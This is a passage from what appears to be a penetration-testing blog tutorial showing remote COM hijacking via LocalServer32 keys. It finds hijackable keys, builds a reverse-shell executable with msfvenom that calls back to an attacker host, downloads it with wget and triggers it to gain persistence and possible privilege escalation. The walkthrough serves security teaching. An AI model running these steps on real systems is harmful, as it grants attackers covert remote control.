+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitk7EN5YeHsEZOn8kzojjrwaeArDKm4_SgctM_9uN2bCzoyWAueR8LtD1xk6Mu7LBvpVn-Vn0dIFZN06UtiWKlETLRB5jlBk49iMrjjYyWt4rRG14Gu7MZdjOX6X5tLJEt7QWkSo5HDxj6pY174Ic6_o0qc7BR_ftDdkDzQGub8Bm5wZHOab8t2dUzAQ/s16000/25.png"/></span></p>
+<h3><span style="color: #800000;">LocalServer32: Remote Access to Machine</span></h3>
+<p><span style="color: #000000;">Specifically, the <strong data-start="424" data-end="445">LocalServer32 key</strong> represents a path to an <strong data-start="470" data-end="490">executable (EXE)</strong> implementation of a process. This means that when an application runs, it refers to the <strong data-start="579" data-end="591">COM keys</strong> and executes the corresponding <strong data-start="623" data-end="635">EXE file</strong>.</span></p>
+<p><span style="color: #000000;">To find all the hijackable localserver32 COM keys, the following procmon filters can be used:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Operation is RegOpenKey Include</strong></span></li>
+<li><span style="color: #000000;"><strong>Result is NAME NOT FOUND Include</strong></span></li>
+<li><span style="color: #000000;"><strong>Path ends with LocalServer32 Include</strong></span></li>
+<li><span style="color: #000000;"><strong>Path begins with HKLM Exclude</strong></span></li>
+</ul>
+<p><span style="color: #000000;">However, since we are using the <strong data-start="679" data-end="697">remote machine</strong>, the following code can help identify exploitable keys. The output lists all files that have an <strong data-start="794" data-end="813">empty reference</strong> to a file that doesn’t exist on the drive. As shown, an interesting file named <strong data-start="893" data-end="913">igniteserver.exe</strong> appears, which points to a <strong data-start="941" data-end="969">World writable directory</strong> (/Users/Public). This means an attacker can place a <strong data-start="1022" data-end="1040">malicious file</strong> in that directory with the same name, <strong data-start="1079" data-end="1099">igniteserver.exe</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
+$inproc | ForEach {$_.LocalServer32} &gt; ignite.txt
+type ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTeSaN3hUUpoUF2JDwWg-bFNjnA-Qg_3umW_bxuciJNx2CVYtsJekteIT1uJsp8Sk4PmMJnzygD-GzQCekHCDopBppenVeZ1JC5qfcqx9rwAxXWZDyJhmhglDRYrjV7_3lNxmLzJ3n2tSz-owvfpsDZeeUl1ISY8LzUwuaWg87hjaDz4N-WVMeDEfXWQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000;">We can manually inspect other files too to see which files are vulnerable to COM hijacking and use SMB to copy malicious files with the same names on the directories.</span></p>
+<h5><span style="color: #000000;">Demonstrating Remote COM Hijacking for Persistence and Privilege Escalation</span></h5>
+<p><span style="color: #000000;">Now, we need to obtain the CLSID of this exe. This can be obtained using the reg query command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg query HKEY_CLASSES_ROOT\CLSID /s /f igniteserver</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifij8JvUcJphzQEqOrAxOEMspEp_5bOhg-Tkb7KYcCrxi2z0OObLJF6BGI9VDQZ_W-uoGIdvOnmDkucWQ980LdcDBv3SaTr1GxaiAa_wmq9pvego3bN0r17qcpgixp48V_raPOOOAItV1W7WV10i0GeZ7Yh1vNZr5HXQHd0gazbFfWpqHuTtQk3VBiJA/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">We have obtained the CLSID reference of this COM object which is <strong>05EAE363-122A-445A-97B6-3DE890E786F8</strong>. This can be confirmed in regedit.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC36CeYaUnSiTXxTypHP8zPQvZ_D9AyGxPNmFgiIize0vQu-h2jTC-k_WnTOSpB9cKE_jUCRJ2lCYS2KxS776N-xLo_5K5okz8hSUgur7tLXUJbL3sHWRt7crGI__GP5l0oxb_QQN8Igzen57cpERhhfBkfn1IUafdJ88je110NMDCh9NNKKQV3vs0mg/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">Now, we need to create an EXE with name igniteserver.exe</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.4 lport=1337 -f exe &gt; igniteserver.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKxW74CWorL3ptwc0TSjajybGSR2aBj--1PtSwE5iy0rWn-gLuHYVDxv-0CNNp0oTjrFhPdxzIOnWB66FuxqjgZDDv6ZzXe1HOolzPQdBvii_EMWs_Pce4pVjyvYa3DMwtNrnPSzEcA_AsVtEcy-64l8Itf7oZA5eOM2CBNkFnn_4v8Jrg26cVgYekpQ/s16000/29.png"/></span></p>
+<p><span style="color: #000000;">Now we need to transfer it to the desired location (C:\Users\Public)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 192.168.1.4/igniteserver.exe -O igniteserver.ex</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoaew6UFPwrnn7mQ_U8XarAVi8J5jNVTIup9X3nQ9Hia_FbBmPidnLvYHeYAUkSbOMtGp8uplqwJUoME9eN_F1vxSBhT7oNj9P91G6C5lehZIEVptBSnaC0oIw97zXluaaCzlE4vp3i-mZ252vuKu9xBNax_2puitBFK90WuCp1IyfGfzQRXMWETg7rg/s16000/30.png"/></span></p>
+<p><span style="color: #000000;">Whenever an application will activate the COM object using this command, we will get persistence. If the application is run as admin we might escalate our privileges as well!</span></p>
+<p><span style="color: #000000;">Now, the application which activates this COM object is using the create instance command in the respective programming language. We are just simulating the same using Powershell like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">[activator]::CreateInstance([type]::GetTypeFromCLSID("{05EAE363-122A-445A-97B6-3DE890E786F8}"))</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhVl5f9FAuKGqzfdEnZPMIG-4KmArQl78_-rp89Z2U2pepHG1xXfKoZ2vcPkWxUhsE0jkU3lLOS5TRCnbLuBUI6b87F4gyfzKduMhR6JhkhilYFrKubrwkH-Pd3EExrPC0kwZv_CU-gIkziDcvhJUWGEUZiDUe_4xDtTt-ULUCvQSpGf-BG_jdPfKbh1g/s16000/31.png"/></span></p>
+<p><span style="color: #000000;">As soon as the application creates this instance and runs the COM key reference, we get our reverse shell!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHXkJmkVAyIKU9X-vodAZwKmfcvEamVj3Cw3waT9R5EgjXhjTR_c44W63rZHIg8Ge0kr41P4k1lzOkxcPY1YtpvD3Wlj_rBOLVT9Nf7h_m5V0HaVid8eRCnyGLChKs9uDdNV5_v2xzr029u93zOe8gZuDLxCJNG5LwfVnVtvJBFQBueplRHMOts-Oa-Q/s16000/32.png"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;"><strong data-start="153" data-end="164">Firstly</strong>, in the article, we demonstrated how we can use <strong data-start="213" data-end="236">hijackable COM keys</strong> (that miss references to libraries) to gain <strong data-start="281" data-end="296">persistence</strong>. We explored two methods: <strong data-start="323" data-end="341">InProcServer32</strong> and <strong data-start="346" data-end="363">LocalServer32</strong>, which applications use to run libraries in a process. Since these libraries execute automatically, replacing them with our <strong data-start="488" data-end="506">malicious file</strong> means our code runs automatically as soon as the related application starts. In the InProcServer32 method, we create another reference to the same COM key in <strong data-start="665" data-end="673" data-is-only-node="">HKCU</strong> to override the one in <strong data-start="697" data-end="705">HKLM</strong>. <strong data-start="707" data-end="721">Conversely</strong>, in the LocalServer32 method, we replace an <strong data-start="766" data-end="783">EXE reference</strong> with our malicious one. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
